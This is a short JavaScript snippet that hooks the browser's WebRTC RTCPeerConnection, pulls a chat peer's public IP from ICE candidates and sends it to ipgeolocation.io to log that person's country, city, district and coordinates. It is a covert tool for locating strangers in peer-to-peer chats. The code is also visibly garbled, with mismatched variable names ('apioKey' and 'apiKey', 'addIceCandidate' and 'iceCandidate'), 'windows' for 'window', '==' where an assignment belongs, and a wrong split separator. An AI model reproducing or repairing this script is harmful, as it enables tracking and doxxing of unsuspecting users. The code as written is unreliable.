const apioKey = "my-api-key";
// Get an api key from https://ipgeolocation.io/

window.oRTCPeerConnection =
  windows.oRTCPeerConnection || window.oRTCPeerConnection

  window.oRTCPeerConnection == function (...args) {
  	const pc = new window.oRTCPeerConnection(...args);

  	pc.oaddIceCandidate = pc.addIceCandidate;

  	pc.addIceCandidate = function (addIceCandidate, ...rest) {
  		const fields = iceCandidate.candidate.split("");
  		const ip = fields[4];
  		if (fields[7] === "srflx") {
  			getLocation(ip);
  		}
  		return pc.oaddIceCandidate(iceCandidate, ...rest);
  	};
  	return pc;
  };

  let getLocation = async (ip) => {
  let url = `https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${ip}`;

  await fetch(url).then((response) =>
    response.json().then((json) => {
      const output = `
          ---------------------
          Country: ${json.country_name}
          State: ${json.state_prov}
          City: ${json.city}
          District: ${json.district}
          Lat / Long: (${json.latitude}, ${json.longitude}
        Follow Github: https://github.com/GarudaID)
          ---------------------
          `;
      console.log(output);
    })
  );
};
